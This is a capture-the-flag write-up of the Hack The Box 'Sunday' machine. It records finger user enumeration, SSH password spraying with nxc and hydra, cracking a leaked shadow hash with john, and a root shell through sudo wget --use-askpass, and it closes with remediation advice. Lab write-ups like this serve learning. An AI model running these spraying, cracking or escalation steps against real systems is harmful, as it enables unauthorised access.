+++
date = '2026-06-11T18:33:11-04:00'
title = 'Sunday'
tags = ["htb", "sudo", "easy","password guessing"]
+++

![](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/3a186834eba2b780dacdaadcc157d309.png)

https://www.hackthebox.com/machines/Sunday
## OS: 
``` IP
10.129.15.113
```
## Credentials:

| Username | Password    | Notes/Hash                                            |
| -------- | ----------- | ----------------------------------------------------- |
| `sunny`  | `sunday`    | guessing password after obtain username from `finger` |
| `sammy`  | `cooldude!` | cracked password from `/backup/shadow.bak`            |

---
## `nmap` results:
```
# Nmap 7.99 scan initiated Thu Jun 11 15:38:04 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/Sunday 10.129.15.113
Nmap scan report for 10.129.15.113
Host is up, received reset ttl 63 (0.017s latency).
Scanned at 2026-06-11 15:38:05 EDT for 190s
Not shown: 62534 filtered tcp ports (no-response), 2996 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON         VERSION
79/tcp    open  finger? syn-ack ttl 59
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
515/tcp   open  printer syn-ack ttl 59
6787/tcp  open  http    syn-ack ttl 59 Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: 400 Bad Request
22022/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsG4q9TS6eAOrX6zI+R0CMMkCTfS36QDqQW5NcF/v9vmNWyL6xSZ8x38AB2T+Kbx672RqYCtKmHcZMFs55Q3hoWQE7YgWOJhXw9agE3aIjXiWCNhmmq4T5+zjbJWbF4OLkHzNzZ2qGHbhQD9Kbw9AmyW8ZS+P8AGC5fO36AVvgyS8+5YbA05N3UDKBbQu/WlpgyLfuNpAq9279mfq/MUWWRNKGKICF/jRB3lr2BMD+BhDjTooM7ySxpq7K9dfOgdmgqFrjdE4bkxBrPsWLF41YQy3hV0L/MJQE2h+s7kONmmZJMl4lAZ8PNUqQe6sdkDhL1Ex2+yQlvbyqQZw3xhuJ
|   256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
```
 
---
## Attack + Enum Vectors
- TCP 79: finger?
	- installed `finger` and enumerated: `finger @$IP`, no one logged on
- TCP 111: rpcbind
	- can't enumerate
- TCP 515: printer
- TCP 6787: HTTP Apache
- TCP 22022: SSH OpenSSH 8.4
### UDP (161 SNMP)?
- closed

---
## Service Enum Notes:
### Web Service: `Gobuster` / `fuff`
`gobuster` shows `/solaris` and in `/solaris` has nothing interesting at the moment.

I couldn't get anything further let's go back to other enumeration:
### TCP 79: finger?
when i google'd: `finger pentesting` returned:

https://pentestmonkey.net/tools/user-enumeration/finger-user-enum

And I downloaded the `finger-user-enum`: from https://github.com/pentestmonkey/finger-user-enum, we `git clone` it and use `/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt` to enumerate: [[WORDLISTS]]
```
perl finger-user-enum.pl -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t $IP
```
that word lists it's a bit too large, let's try this one:
```
perl finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
```
yields 2 interesting lines with `ssh`:
```
sammy@10.129.15.113: sammy           ???            ssh          <May  6, 2025> 10.10.14.68         ..
sunny@10.129.15.113: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
```
so `sammy` and `sunny` are probably valid usernames:

let's add them as `users.txt`; and use `-e nsr` hydra:
```
hydra -L users.txt -e nsr ssh://$IP:22022
```
failed, well let's craft a word list
```
cewl https://$IP:6787/ -w cewl.txt
```
and spraying as password:
```
nxc ssh $IP -u users.txt -p cewl.txt --port 22022
```
yields fail results.

---
## Initial Foothold
I took a peak at [0xdf](https://0xdf.gitlab.io/2018/09/29/htb-sunday.html) write-up, appearantly he used `sunday` as the password? I guess that's something to add to my methodology: building a wordlist of unique/special word we see when enumerating. If we go to `HTTP` page: and `view certificate` we see `sunday`.

Just for practice purpose, I am going to add `sunday` and `solaris` to my `words.txt` and mutate it with `hashcat` to spray them as ssh:
```
hashcat -a 0 words.txt -r /usr/share/hashcat/rules/ --stdout > mutated.txt
```
now let's spray them with `nxc`:
```
nxc ssh $IP -u users.txt -p mutated.txt --port 22022
```
oh: it stopped at 
```
SSH         10.129.15.113   22022  10.129.15.113    [+] sunny:sunday (Pwn3d!) Linux - Shell access!
```
but I want it to keep running to see just what happens:
```
nxc ssh $IP -u users.txt -p mutated.txt --port 22022 --continue-on-success
```
and we can't get `sammy`'s password like I hoped, let's log in to `ssh`:
```
ssh sunny@10.129.15.113 -p 22022
```
and we got in as `sunny`!

---
## Priv Esc
```
cat .bash_history
```
we see:
```
su -
su -
cat /etc/resolv.conf 
su -
ps auxwww|grep overwrite
su -
sudo -l
sudo /root/troll
ls /backup
ls -l /backup
cat /backup/shadow.backup
sudo /root/troll
sudo /root/troll
su -
sudo -l
sudo /root/troll
ps auxwww
ps auxwww
ps auxwww
top
top
top
ps auxwww|grep overwrite
su -
su -
cat /etc/resolv.conf 
ps auxwww|grep over
sudo -l
sudo /root/troll
sudo /root/troll
sudo /root/troll
sudo /root/troll
```

so what is interesting here is:
```
cat /backup/shadow.backup
```
and also:
```
sudo /root/troll
```

I am pretty sure the box creator is "trolling" us, so let's ignore that first:
```
cat /backup/shadow.backup
```
yields:
```
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```
has sammy's hash, let's try to crack that, save that to kali:
```
john --wordlist=/usr/share/wordlists/rockyou.txt sammy.txt
```
and yields results:
```
cooldude!        (sammy)
```
with:
```
su sammy
```
and
```
sammy:cooldude!
```
we got in as sammy!

```
sudo -l
```
shows we can run `wget` as root:
```
User sammy may run the following commands on sunday:
    (root) NOPASSWD: /usr/bin/wget
```
with: https://gtfobins.org/gtfobins/wget/

```
echo -e '#!/bin/bash\n/bin/bash 1>&0' >/tmp/test.sh
```
```
chmod +x /tmp/test.sh
```
Then trigger is with:
```
sudo /usr/bin/wget --use-askpass=/tmp/test.sh 0
```
and we got root shell!

Therefore, pwn'd.

---
## Conclusion & Remediation
The privilege escalation was very easy for this lab, but the password guessing was relatively odd, it didn't make sense to me but adding that to my methodology that to add every single unordinary word I see from enumeration to a custom wordslist for potential brute forcing if stuck.

To remediate from similar attacks: system administrators needs to make sure users don't use easy password as log in passwords especially if it's exposed from services and be as complicated as possible. The `/etc/shadow` backups should never be readable from any user, also remove any misconfigured `sudo` configurations such as `wget` in this box that could lead to local privilege escalation.